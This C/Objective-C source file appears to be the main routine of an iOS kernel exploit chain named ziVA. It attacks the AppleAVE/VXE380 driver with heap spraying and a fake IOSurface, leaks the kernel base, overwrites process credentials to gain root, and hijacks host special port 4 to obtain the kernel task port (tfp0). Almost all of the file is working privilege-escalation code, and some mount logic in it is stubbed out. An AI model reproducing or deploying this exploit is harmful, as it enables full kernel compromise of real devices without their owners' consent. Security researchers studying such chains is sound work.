#include "kernel_read.h"
#include "apple_ave_pwn.h"
#include "offsets.h"
#include "heap_spray.h"
#include "iosurface_utils.h"
#include "rwx.h"
#include "post_exploit_ziva.h"
#include "kernel_call.h"

#include "tfp0.h"
#include "unjail.h"
#include "Utilities.h"

#include "mount_common.h"


#define KERNEL_MAGIC 							(0xfeedfacf)

static
kern_return_t initialize_iokit_connections() {
	
	kern_return_t ret = KERN_SUCCESS;

	ret = apple_ave_pwn_init();
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: initializing AppleAVE/VXE380 pwn\n");
		goto cleanup;
	}

	ret = kernel_read_init();
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: initializing kernel read\n");
		goto cleanup;
	}

cleanup:
	if (KERN_SUCCESS != ret)
	{
		kernel_read_cleanup();
		apple_ave_pwn_cleanup();
	}
	return ret;
}



// Tests our RW capabilities, then overwrites our credentials so we are root.
static
kern_return_t test_rw_and_get_root() {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t kernel_magic = 0;

	ret = rwx_read(offsets_get_kernel_base(), &kernel_magic, 4);
	if (KERN_SUCCESS != ret || KERNEL_MAGIC != kernel_magic)
	{
		printf("[ERROR]: reading kernel magic\n");
		if (KERN_SUCCESS == ret)
		{
			ret = KERN_FAILURE;
		}
		goto cleanup;
	} else {
		printf("[INFO]: kernel magic: %x\n", (uint32_t)kernel_magic);
	}

	ret = post_exploit_get_kernel_creds();
	if (KERN_SUCCESS != ret || getuid())
	{
		printf("[ERROR]: getting root\n");
		if (KERN_SUCCESS == ret) {
			ret = KERN_NO_ACCESS;
		}
		goto cleanup;
	}

cleanup:
	return ret;
}

// Thanks Siguza!
kern_return_t set_tfp0 () {
    
    kern_return_t ret = KERN_FAILURE;

    // At this point we have root but no kernel task yet.
    int uid = setuid(0); // update host to host_priv

    if(uid != 0) { // Failed
        printf("[ERROR]: couldn't set uid to 0\n");
        goto cleanup;
    } else {

        printf("[INFO]: uid = %d\n", uid);

        uint64_t kernel_task = 0;
        ret = rwx_read(offsets_get_kernel_base() + OFFSET(kernel_task), &kernel_task, sizeof(kernel_task));
        printf("[INFO]: kernel_task: %llx\n", kernel_task);
        
        if(ret == KERN_SUCCESS) {
            
            uint64_t kernel_port = 0;
            ret = rwx_read(kernel_task + TASK_ITK_SELF_OFF, &kernel_port, sizeof(kernel_port));
            printf("[INFO]: kernel_port: %llx\n", kernel_port);
            
            if(ret == KERN_SUCCESS) {

                ret = rwx_write(offsets_get_kernel_base() + OFFSET(realhost) + REALHOST_SPECIAL_4_OFF, &kernel_port, sizeof(kernel_port));
                printf("[INFO]: new kernel_port: %llx\n", kernel_port);
                
                if(ret == KERN_SUCCESS) {
                    extern task_t tfp0;
                    ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &tfp0);
                    

                    // the "0" is to differentiate between this and alt_tfp0's
                    printf("[INFO]: host_get_special_port (0): 0x%x\n", tfp0);
                    
//                    if(ret != KERN_SUCCESS) {
                        printf("[ERROR]: host_get_special_port: %s\n", mach_error_string(ret));
                        
                        NSLog(@"[SAIGON]: going to set_alt_tfp0!");
                        sleep(1);
                        
                        ret = set_alt_tfp0();
                        
                        if(ret != KERN_SUCCESS) {
                            NSLog(@"[ERROR]: tfp0 workaround failed\n");
                        } else {
                            NSLog(@"[SAIGON]: tfp0 workaround WORKED!!!!\n");
                            sleep(10);
                        }
//                    }
                }
            }
        }
    }

cleanup:
    return ret;
}

/*
 * Function name: 	__mac_mount
 * Description:		Mimics the __mac_mount function in vfs_syscalls.c but without 'release kernels' check
 * Returns:			kern_return_t.
 */

kern_return_t __mac_mount() {
    
    kern_return_t ret = KERN_SUCCESS;
    
    /*
     muap.type = uap->type;
     muap.path = uap->path;
     muap.flags = uap->flags;
     muap.data = uap->data;
     muap.mac_p = USER_ADDR_NULL;
     */
    
    
//    char fstypename[MFSNAMELEN];

    
    // Taken from vfs_syscalls.c
    // mount_common(fstypename, pvp, vp, &nd.ni_cnd, uap->data, flags, 0, labelstr, FALSE, ctx);
//    uint64_t args[10] = { *fstypename,  0x0 /* pvp */, };
//    
//    ret = kernel_call_x(NULL, 0, offsets_get_kernel_base() + OFFSET(mount_common), 10, args);
//    if (ret != KERN_SUCCESS) {
//        printf("[ERROR]: failed doing printf\n");
//        return KERN_FAILURE; // Fail
//    } else {
//        printf("[INFO]: sucessfully printf\n");
//    }
    
    return ret;
}

// Called by triple fetch
kern_return_t ziva_go() {
    
	kern_return_t ret = KERN_SUCCESS;
	uint64_t kernel_base = 0;
	uint64_t kernel_spray_address = 0;

    printf("[*] starting ziVA..\n");
    
    if(get_privileged_port() == MACH_PORT_NULL) {
        printf("[ERROR]: Got an null privileged port.\n");
        return KERN_FAILURE; // Fail
    }
    
	if (initialize_iokit_connections() != KERN_SUCCESS) {
		printf("[ERROR]: initializing IOKit connections!\n");
		return KERN_FAILURE; // Fail
	}
    
	if (heap_spray_init() != KERN_SUCCESS) {
		printf("[ERROR]: initializing heap spray\n");
        return KERN_FAILURE; // Fail
	}
    
	if (kernel_read_leak_kernel_base(&kernel_base) != KERN_SUCCESS) {
		printf("[ERROR]: leaking kernel base\n");
        return KERN_FAILURE; // Fail
	}

    printf("[INFO]: Got kernel base at: %llx\n", kernel_base);

	offsets_set_kernel_base(kernel_base);

	if (heap_spray_start_spraying(&kernel_spray_address) != KERN_SUCCESS) {
		printf("[ERROR]: spraying heap\n");
        return KERN_FAILURE; // Fail
    } else {
        printf("[INFO]: finished spraying successfully!\n");
    }

	ret = apple_ave_pwn_use_fake_iosurface(kernel_spray_address);
	if (ret != KERN_SUCCESS) {
		printf("[ERROR]: using fake IOSurface... we should be dead by here.\n");
	} else {
        printf("[INFO]: We're still alive and the fake surface was used\n");
	}
    
    printf("[INFO]: our uid so far: %d\n", getuid());
    
	ret = test_rw_and_get_root();
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: getting root\n");
        return KERN_FAILURE; // Fail
    } else {
        printf("[INFO]: got root!\n");
    }
    
    printf("[INFO]: going to call mount_common..\n");
    kern_return_t xx = mount_common();
    

    NSLog(@"[SAIGON]: going to set_tfp0!");
    sleep(15);
    
    ret = set_tfp0();
    if (ret != KERN_SUCCESS) {
        printf("[ERROR]: failed setting task for pid (0)\n");
        return KERN_FAILURE; // Fail
    } else {
        printf("[INFO]: sucessfully set task for pid: 0x%x\n", tfp0);
    }
    
    
    // We're root now!
    printf("[INFO]: ziVA is now root\n");
    printf("[INFO]: our uid so far: %d\n", getuid());

    kernel_read_cleanup();
    apple_ave_pwn_cleanup();
    heap_spray_cleanup();
    
    return KERN_SUCCESS; // Success!
}
